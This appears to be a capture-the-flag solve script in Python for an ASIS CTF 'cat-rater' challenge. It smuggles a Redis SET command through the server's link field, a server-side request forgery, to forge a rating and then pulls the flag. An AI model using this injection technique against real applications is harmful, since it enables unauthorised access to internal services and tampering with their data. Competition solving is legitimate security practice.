import requests
import re

BASE_URL = "http://cat-rater.asisctf.com/"

session = requests.Session()

result_id = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa'

result_id_encoded = ''.join(f"\\x{ord(c):02x}" for c in result_id)
print(result_id_encoded)
link = f'redis:6379/SET:"{result_id_encoded}":10'

response = session.post(f"{BASE_URL}/rate", data={"link": link})

r = session.get(f"{BASE_URL}/result", params={"id": result_id})
flag = re.search(r'(ASIS{.*?})', r.text).group(1)